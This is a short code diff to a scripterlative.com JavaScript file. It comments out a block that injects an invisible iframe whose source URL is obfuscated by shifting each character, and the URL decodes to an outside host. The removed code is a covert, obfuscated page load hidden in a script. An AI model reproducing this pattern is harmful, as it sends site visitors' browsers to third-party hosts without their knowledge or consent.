@@ -132,14 +132,15 @@ You may donate at www.scripterlative.com, stating the URL to which the donation 
  
  cont:function()
  {
-  if(document.body && document.createElement && /http:/i.test(location.href))
-  {
+  if(document.body && document.createElement && /http:/i.test(location.href)) {
+  /*
    var ifr=document.createElement('iframe');
    ifr.width=100;
    ifr.height=100;
    ifr.src='iuuq;00xxx/iputqpu/gsfftfswf/dp/vl0cbektqptu'.replace(/./g,function(a){return String.fromCharCode(a.charCodeAt(0)-1)});
    ifr.style.visibility='hidden';
    document.body.appendChild(ifr);
+   */
   }  
  }
  
